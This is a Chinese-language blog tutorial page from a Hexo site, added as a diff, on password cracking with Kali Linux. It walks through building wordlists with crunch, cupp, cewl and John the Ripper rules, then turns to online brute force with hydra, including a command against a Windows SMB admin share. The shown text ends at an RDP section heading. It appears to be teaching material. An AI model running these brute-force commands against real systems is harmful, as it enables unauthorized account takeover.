@@ -1,0 +1,1957 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-bounce.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32x32.ico?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="keywords" content="信息安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali Linux渗透测试之密码破解">
+<meta property="og:url" content="http://yoursite.com/2018/09/15/Kali-Linux渗透测试之密码破解/index.html">
+<meta property="og:site_name" content="LoongEyes">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/1.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/3.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/2.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/4.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/5.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/6.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/7.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/8.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/9.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/10.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/11.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/12.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/13.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/14.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/15.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/16.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/17.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/18.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/19.png">
+<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/20.png">
+<meta property="og:updated_time" content="2019-05-17T17:14:09.708Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Kali Linux渗透测试之密码破解">
+<meta name="twitter:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/mimapojie/1.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/15/Kali-Linux渗透测试之密码破解/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Kali Linux渗透测试之密码破解 | LoongEyes</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">LoongEyes</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/15/Kali-Linux渗透测试之密码破解/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LoongEyes">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LoongEyes">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Kali Linux渗透测试之密码破解
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-09-15 15:27:00" itemprop="dateCreated datePublished" datetime="2018-09-15T15:27:00+08:00">2018-09-15</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-05-18 01:14:09" itemprop="dateModified" datetime="2019-05-18T01:14:09+08:00">2019-05-18</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Kali-Linux渗透测试/" itemprop="url" rel="index"><span itemprop="name">Kali Linux渗透测试</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<a id="more"></a>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>当目标系统实施了强安全措施</p>
+<ol>
+<li><p>安装了所有补丁</p>
+</li>
+<li><p>无任何已知漏洞</p>
+</li>
+<li><p>无应用层漏洞</p>
+</li>
+<li><p>攻击面已经最小化</p>
+</li>
+</ol>
+<p>此时可以使用其他方法</p>
+<ol>
+<li><p>社会工程学，攻击人的弱点</p>
+</li>
+<li><p>获取目标系统用户身份</p>
+<ol>
+<li><p>非授权的用户无法访问授信资源，已认证用户可以访问授信资源</p>
+</li>
+<li><p>已有用户账号权限受限，需要提权</p>
+</li>
+<li><p>不会触发系统报警</p>
+</li>
+</ol>
+</li>
+</ol>
+<hr>
+<h1 id="身份认证方法"><a href="#身份认证方法" class="headerlink" title="身份认证方法"></a>身份认证方法</h1><h2 id="证明你是你声称你是的那个人"><a href="#证明你是你声称你是的那个人" class="headerlink" title="证明你是你声称你是的那个人"></a>证明你是你声称你是的那个人</h2><ol>
+<li><p>你知道什么</p>
+<p> 账号密码，<code>PIN</code>码， <code>passphrase</code>：密码文</p>
+</li>
+<li><p>你有什么</p>
+<p> 令牌，<code>token</code>，<code>key</code>，证书，密宝，手机</p>
+</li>
+<li><p>你是谁</p>
+<p> 指纹，视网膜，虹膜，掌纹，声纹，面部识别</p>
+</li>
+<li><p>多因素身份认证</p>
+<p> 以上多种方法结合使用</p>
+</li>
+</ol>
+<p><strong>基于互联网的身份认证仍以账号密码为主要形式</strong></p>
+<hr>
+<h1 id="密码破解方法"><a href="#密码破解方法" class="headerlink" title="密码破解方法"></a>密码破解方法</h1><ol>
+<li><p>人工猜解</p>
+<p> 垃圾桶工程</p>
+<p>被动信息收集</p>
+</li>
+<li><p>基于字典的暴力破解(主流)</p>
+</li>
+<li><p>利用键盘上可以敲击的全部字符进行组合来暴力破解(键盘空间字符爆破)</p>
+</li>
+<li><p>字典</p>
+<p> 保存有用户名和密码的文本文件</p>
+<p><code>Kali Linux</code>中存在的字典</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/wordlist</span><br><span class="line">/usr/share/wfuzz/wordlist</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><h2 id="键盘空间字符爆破"><a href="#键盘空间字符爆破" class="headerlink" title="键盘空间字符爆破"></a>键盘空间字符爆破</h2><ol>
+<li><p>全键盘空间字符</p>
+</li>
+<li><p>部分键盘空间字符(基于规则)</p>
+<p> 数字，小写字母，大写字母，符号，空格，瑞典字符，高位<code>ASCII</code>码</p>
+</li>
+</ol>
+<h2 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h2><p>用于生成字典</p>
+<ol>
+<li><p>格式：<code>crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]</code></p>
+<p> <code>min-len</code>：字典中每行内容的最小长度</p>
+<p> <code>max-len</code>：字典中每行内容的最大长度</p>
+<p> <code>charset string</code>：字符集，默认为小写字符</p>
+</li>
+<li><p>选项：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-b：按大小分割字典文件为小体积的字典文件(kb/kib,mb/mib,gb/gib;不带i的以1000为划分，带i的以1024为划分)，需与-o START结合使用</span><br><span class="line">-c：按每个字典的行数分割字典文件为小体积的字典文件，需与-o START结合使用</span><br><span class="line">-o START：生成字典文件时字典文件中内容以从小到大的方式排列</span><br><span class="line">-o：输出</span><br><span class="line">-d：同一字符连续出现的次数</span><br></pre></td></tr></table></figure>
+<p> 例：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 6 6 0123456789 -o START -d 2 -b 1mb</span><br></pre></td></tr></table></figure>
+<p> <img src="/images/KaliLinux_shentouceshi/mimapojie/1.png" alt="1.png"></p>
+<p> 当前目录下会生成字典文件，字典中内容为每行6个字符，按升序排列，同一字符最多连续出现2次，每个字典文件<code>1MB</code>大小</p>
+</li>
+<li><p>字符集：</p>
+<p> <code>crunch</code>工具默认存在字符集列表文件，位于<code>/usr/share/crunch/charset.lst</code>，使用<code>-f</code>参数指定使用的字符集</p>
+<p> <img src="/images/KaliLinux_shentouceshi/mimapojie/3.png" alt="3.png"></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt</span><br></pre></td></tr></table></figure>
+<p> <img src="/images/KaliLinux_shentouceshi/mimapojie/2.png" alt="2.png"></p>
+</li>
+<li><p>无重复字符</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crunch 1 1 -p 1234567890</span><br><span class="line"></span><br><span class="line">-p：指定一串字符，crunch会对将这些字符所有的排列可能情况生成为一个字典</span><br><span class="line">	此参数必须是命令中的最后一个参数</span><br><span class="line">	最大，最小字符长度参数失效，但必须存在</span><br><span class="line">	与-s参数不兼容</span><br></pre></td></tr></table></figure>
+<p> <img src="/images/KaliLinux_shentouceshi/mimapojie/4.png" alt="4.png"></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">crunch 4 4 0123456789 -s 9900</span><br><span class="line">  </span><br><span class="line">-s：指定字典生成的起始字符串</span><br><span class="line">  </span><br><span class="line">默认无-s参数，字典中的内容范围是0000-9999，添加-s参数后，字典中的内容范围是9900-9999</span><br></pre></td></tr></table></figure>
+<p> <img src="/images/KaliLinux_shentouceshi/mimapojie/5.png" alt="5.png"></p>
+</li>
+<li><p>读取文件生成字典</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">crunch 1 1 -q read.txt</span><br><span class="line"></span><br><span class="line">-q：指定读取的文件</span><br><span class="line">	将读取的文件中的每一行当作一个基本字符，利用这些基本字符生成不同排列顺序的字典</span><br><span class="line">	最大，最小字符长度参数失效，但必须存在</span><br></pre></td></tr></table></figure>
+<p><img src="/images/KaliLinux_shentouceshi/mimapojie/6.png" alt="6.png"></p>
+<p><img src="/images/KaliLinux_shentouceshi/mimapojie/7.png" alt="7.png"></p>
+</li>
+<li><p>字典生成规则</p>
+<p> 利用密码的已知规律，使用<code>crunch</code>生成符合规律的字典文件</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">crunch 6 6 -t @,%%^^ </span><br><span class="line"></span><br><span class="line">-t：指定已知规律的通配符</span><br><span class="line"></span><br><span class="line">@：小写字母	lalpha</span><br><span class="line">,：大写字母	ualpha</span><br><span class="line">%：数字	numeric</span><br><span class="line">^：符号	symbols</span><br></pre></td></tr></table></figure>
+<p><img src="/images/KaliLinux_shentouceshi/mimapojie/8.png" alt="8.png"></p>
+</li>
+<li><p>输出文件压缩</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crunch 4 4 -t @,%^ -o 1.txt -z 7z</span><br><span class="line"></span><br><span class="line">-z：将生成的字典文件做压缩，支持的格式有：7z，gzip，bzip2，lzma。其中7z的压缩比率最大</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>例</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crunch 4 4 -f /usr/share/crunch/charset.lst hex-lower -o w.txt -t @d@@</span><br><span class="line"></span><br><span class="line">当指定-f字符集时，再指定-t中存在@时，此时的@表示字符集中的所有字符，而不是表示为小写字母</span><br></pre></td></tr></table></figure>
+<p> <img src="/images/KaliLinux_shentouceshi/mimapojie/9.png" alt="9.png"></p>
+<p> <img src="/images/KaliLinux_shentouceshi/mimapojie/10.png" alt="10.png"></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crunch 4 5 -p dog cat bird</span><br><span class="line">   </span><br><span class="line">此时-p将后面的三个字符串视为三个基本字符，将这三个基本字符进行所有可能的排列，生成字典</span><br></pre></td></tr></table></figure>
+<p> <img src="/images/KaliLinux_shentouceshi/mimapojie/11.png" alt="11.png"></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crunch 5 5 abc DEF + \!@# -t ,@^%,</span><br><span class="line">  </span><br><span class="line">+：占位符</span><br><span class="line">\：转义符</span><br><span class="line">  </span><br><span class="line">abc DEF + \!@#表示小写字母只使用abc，大写字母只使用DEF，数字使用+占位符，表示全部数字，特殊字符只使用!@#</span><br></pre></td></tr></table></figure>
+<p> <img src="/images/KaliLinux_shentouceshi/mimapojie/12.png" alt="12.png"></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">crunch 5 5 -t ddd%% -p dog cat bird</span><br><span class="line">  </span><br><span class="line">此时命令中因指定了-p，所以ddd不表示字典前三位为ddd，只是占位符，可使用其他任意字符。指定-t参数时要符合密码的长度</span><br><span class="line">  </span><br><span class="line">此处不同于-p参数指定的值都是占位符</span><br></pre></td></tr></table></figure>
+<p> <img src="/images/KaliLinux_shentouceshi/mimapojie/13.png" alt="13.png"></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crunch 5 5 -d 2@ -t @@@%%</span><br><span class="line">  </span><br><span class="line">-d 2@表示同一个小写字母连续出现的次数不大于2次</span><br></pre></td></tr></table></figure>
+<p> <img src="/images/KaliLinux_shentouceshi/mimapojie/14.png" alt="14.png"></p>
+</li>
+<li><p>与其他程序组合应用</p>
+<p> 当本地没有足够的空间存储生成的字典文件时，可将生成的字典直接交给破解程序使用</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w -</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 10 10 12345 --stdout | airolib-ng testdb -import passwd -</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="cupp"><a href="#cupp" class="headerlink" title="cupp"></a>cupp</h2><p><code>Common User Password Profiler</code></p>
+<p>按个人信息生成其专属的密码字典</p>
+<ol>
+<li><p>下载安装</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Mebus/cupp.git</span><br></pre></td></tr></table></figure>
+<p> <img src="/images/KaliLinux_shentouceshi/mimapojie/15.png" alt="15.png"></p>
+</li>
+<li><p>使用</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 cupp3.py -i </span><br><span class="line"></span><br><span class="line">-i：以交互模式生成字典</span><br></pre></td></tr></table></figure>
+<p><img src="/images/KaliLinux_shentouceshi/mimapojie/16.png" alt="16.png"></p>
+</li>
+</ol>
+<h2 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h2><p>通过收集网站信息生成字典</p>
+<p>支持基本，摘要身份认证</p>
+<p>支持代理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cewl IP/域名 -m 3 -d 3 -e -c -v -w a.txt</span><br><span class="line"></span><br><span class="line">-m：收集目标网站上的最小单词长度</span><br><span class="line">-d：爬网深度</span><br><span class="line">-e：收集email地址信息</span><br><span class="line">-c：按每个单词出现的次数生成字典</span><br><span class="line">-v：显示详细信息</span><br><span class="line">-w：输出</span><br></pre></td></tr></table></figure>
+<p><img src="/images/KaliLinux_shentouceshi/mimapojie/17.png" alt="17.png"></p>
+<p><img src="/images/KaliLinux_shentouceshi/mimapojie/18.png" alt="18.png"></p>
+<p>如图，字符串后的数字为此字符串在站点中出现的次数</p>
+<h3 id="用户密码变型"><a href="#用户密码变型" class="headerlink" title="用户密码变型"></a>用户密码变型</h3><ol>
+<li><p>基于<code>cewl</code>的结果进行密码变型</p>
+</li>
+<li><p>末尾增加数字串</p>
+</li>
+<li><p>字母大小写变化</p>
+</li>
+<li><p>字母与符号互相转换</p>
+</li>
+<li><p>字母与数字互相转换</p>
+<p> <code>P@$$w0rd</code></p>
+</li>
+</ol>
+<h2 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a>John the Ripper</h2><p>使用<code>John the Ripper</code>配置文件实现密码动态变型</p>
+<p>配置文件位置：<code>/etc/john/john.conf</code></p>
+<ol>
+<li><p>修改配置文件</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[List.Rules:Wordlist]	#规则字段位置</span><br><span class="line"></span><br><span class="line">可添加</span><br><span class="line">$[0-9]$[0-9]$[0-9]		#字典末尾添加3位数字</span><br><span class="line">$[0-9]$[0-9]$[0-9]$[a-zA-Z]		#字典末尾添加3位数字与一位字母</span><br><span class="line">$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[`#!#$%^&amp;*()-=_+]		#字典末尾添加3位数字，3位字母，一位特殊字符</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用<code>John the Ripper</code>生成密码文件</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=cewl.txt --rules --stdout &gt; m.txt</span><br><span class="line"></span><br><span class="line">--wordlist:基础密码文件</span><br><span class="line">--rules:使用john.conf配置文件中的规则，也可指定要使用的规则</span><br><span class="line">--stdout:标准输出</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol start="3">
+<li><p>可自己添加<code>John the Ripper</code>工具配置文件规则</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[List.Rules:规则名称]</span><br><span class="line">$[0-9]$[0-9]$[0-9]		#字典末尾添加3位数字</span><br><span class="line">$[0-9]$[0-9]$[0-9]$[a-zA-Z]		#字典末尾添加3位数字与一位字母</span><br><span class="line">$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[`#!#$%^&amp;*()-=_+]		#字典末尾添加3位数字，3位字母，一位特殊字符</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol start="4">
+<li><p>指定某项规则生成密码文件</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=cewl.txt --rules=test --stdout &gt; m.txt</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=ahm.lst --rules=test HASHFILE</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="pw-inspector"><a href="#pw-inspector" class="headerlink" title="pw-inspector"></a>pw-inspector</h2><p>按长度和字符集筛选字典</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pw-inspector -i /usr/share/wordlists/nma.lst -o p.lst -l -m 3 -M 5</span><br><span class="line"></span><br><span class="line">-i：指定要筛选的字典文件</span><br><span class="line">-o：设置筛选完成后的输出文件</span><br><span class="line">-l：以小写字母的条件筛选</span><br><span class="line">-m：指定最小长度</span><br><span class="line">-M：指定最大长度</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="在线密码破解"><a href="#在线密码破解" class="headerlink" title="在线密码破解"></a>在线密码破解</h1><p>对在运的服务器进行密码字典爆破，根据密码字典逐个尝试请求服务器。</p>
+<h2 id="hydra–九头蛇"><a href="#hydra–九头蛇" class="headerlink" title="hydra–九头蛇"></a>hydra–九头蛇</h2><h3 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a>Windows密码破解</h3><p>破解<code>Windows</code>中<code>admin</code>管理共享(<code>smb</code>服务)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hydra -l administrator -P pass.lst smb://1.1.1.1/admin$ -vVd</span><br><span class="line"></span><br><span class="line">-l：指定破解使用的用户名</span><br><span class="line">-L：指定破解使用的用户名字典</span><br><span class="line">-p：指定破解使用的密码</span><br><span class="line">-P：指定破解使用的密码字典</span><br><span class="line">-v：详细模式</span><br><span class="line">-V：显示登陆与每次尝试</span><br><span class="line">-d：调试模式</span><br><span class="line">-R：断点续破解</span><br></pre></td></tr></table></figure>
+<p>破解<code>Windows</code>中远程桌面服务(<code>rdp</code>服务)</p>
